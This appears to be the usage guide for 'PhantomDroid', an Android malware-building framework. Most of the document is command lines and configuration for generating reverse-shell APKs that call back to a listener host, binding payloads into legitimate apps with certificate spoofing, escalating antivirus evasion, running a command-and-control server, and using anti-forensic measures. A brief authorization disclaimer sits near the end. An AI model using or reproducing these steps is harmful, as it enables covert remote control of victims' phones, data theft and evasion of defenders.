# PhantomDroid Framework v2.0 - Usage Guide

## Quick Start

### 1. Installation
```bash
# Clone or extract PhantomDroid
cd PhantomDroid

# Run installer (Linux/macOS)
chmod +x install.sh
sudo ./install.sh

# Make main script executable
chmod +x phantomdroid.sh
```

### 2. Basic Usage

#### Interactive Mode (Recommended)
```bash
./phantomdroid.sh
```

#### Command Line Mode
```bash
# Generate standalone payload
./phantomdroid.sh --payload tcp --lhost 192.168.1.100 --lport 4444

# Bind payload to existing APK
./phantomdroid.sh --target app.apk --lhost 192.168.1.100 --lport 4444
```

## Main Menu Options

### 1. Generate Standalone Payload
Creates a new APK with embedded payload:
- **TCP Reverse Shell**: Direct TCP connection
- **HTTP/HTTPS Shell**: Web-based communication
- **DNS Tunneling**: DNS-based data exfiltration
- **SMS Command Shell**: SMS-based control

### 2. Bind Payload to Existing APK
Injects payload into legitimate APK:
- **Smart Injection**: Intelligent code insertion
- **Resource Hijacking**: Hide payload in resources
- **Code Cave Injection**: Use unused code spaces
- **Certificate Spoofing**: Preserve original certificates

### 3. Advanced AV Evasion
Apply sophisticated evasion techniques:
- **Basic**: Signature randomization
- **Medium**: Code obfuscation + API hiding
- **High**: Polymorphic + Anti-analysis
- **Extreme**: AI-powered + Zero-day techniques

### 4. Start C2 Server
Launch command & control server:
- **HTTP/HTTPS**: Web-based C2
- **DNS Tunneling**: DNS-based communication
- **Multi-Protocol**: Combined protocols

## Command Line Arguments

```bash
Options:
  --payload TYPE     Payload type (tcp, http, dns, sms)
  --lhost IP         Listening host IP address
  --lport PORT       Listening port number
  --target APK       Target APK file for binding
  --evasion LEVEL    Evasion level (basic, medium, high, extreme)
  --debug            Enable debug mode
  --verbose          Enable verbose output
  --help, -h         Show help message
```

## Web Interface

Start the web interface:
```bash
python3 core/web_interface.py
```

Access at: `http://localhost:8080`

Features:
- Payload generation
- APK binding
- C2 dashboard
- File management

## Advanced Usage

### Custom Payload Generation
```bash
python3 core/payload_generator.py \
    --type tcp_reverse \
    --lhost 192.168.1.100 \
    --lport 4444 \
    --evasion extreme \
    --output custom_output
```

### APK Binding with Specific Method
```bash
python3 core/apk_binder.py \
    --apk original.apk \
    --lhost 192.168.1.100 \
    --lport 4444 \
    --method 1 \
    --evasion high
```

### AV Evasion Processing
```bash
python3 core/av_evasion.py \
    --level extreme \
    --input payload_source \
    --output evaded_payload
```

### C2 Server with Custom Configuration
```bash
python3 core/c2_server.py \
    --port 8080 \
    --protocol 1 \
    --log-dir custom_logs
```

## Configuration

### Core Configuration (`config/core.conf`)
```ini
[general]
debug = false
verbose = false
auto_cleanup = true

[paths]
output_dir = output
log_dir = logs
temp_dir = output/temp

[evasion]
default_level = medium
enable_encryption = true
enable_obfuscation = true
```

### Payload Configuration (`config/payloads.conf`)
```ini
[tcp_reverse]
default_port = 4444
timeout = 30
retry_count = 3

[http_shell]
default_port = 8080
user_agent = Mozilla/5.0 (Android)
timeout = 60
```

## Output Structure

```
output/
├── payloads/          # Generated standalone payloads
├── signed/            # Signed APK files
├── temp/              # Temporary files
└── logs/              # Framework logs
```

## Troubleshooting

### Common Issues

1. **Permission Denied**
   ```bash
   chmod +x phantomdroid.sh
   chmod +x core/*.py
   ```

2. **Missing Dependencies**
   ```bash
   sudo ./install.sh
   pip3 install -r requirements.txt
   ```

3. **APK Signing Failed**
   ```bash
   # Ensure Java is installed
   java -version
   
   # Check keytool availability
   which keytool
   ```

4. **Python Module Errors**
   ```bash
   # Install missing modules
   pip3 install flask cryptography
   ```

### Debug Mode
Enable debug mode for detailed output:
```bash
./phantomdroid.sh --debug --verbose
```

### Log Files
Check logs for errors:
```bash
tail -f logs/phantomdroid.log
tail -f logs/c2_server.log
```

## Security Considerations

### Legal Compliance
- ✅ Obtain written authorization before testing
- ✅ Test only on systems you own or have permission to test
- ✅ Follow responsible disclosure practices
- ❌ Never use on unauthorized systems

### Best Practices
1. **Isolated Testing Environment**
   - Use dedicated test networks
   - Isolate from production systems
   - Use virtual machines when possible

2. **Data Protection**
   - Encrypt sensitive payloads
   - Secure communication channels
   - Protect test data

3. **Documentation**
   - Document all testing activities
   - Maintain audit trails
   - Report findings responsibly

## Advanced Features

### Steganographic Payloads
Hide payloads within legitimate app resources using advanced steganography techniques.

### Machine Learning Evasion
AI-powered evasion techniques that adapt to security solutions.

### Zero-Day Integration
Framework for integrating and deploying zero-day exploits.

### Forensic Counter-Measures
Anti-forensic techniques to prevent analysis and attribution.

## Support

For issues and questions:
1. Check the troubleshooting section
2. Review log files for errors
3. Ensure all dependencies are installed
4. Verify system requirements

## Contributing

Contributions are welcome! Please:
1. Follow coding standards
2. Add tests for new features
3. Update documentation
4. Submit pull requests

## License

This project is licensed under the MIT License with additional ethical use requirements. See LICENSE file for details.

---

**Remember**: Use PhantomDroid responsibly and only for authorized security testing!
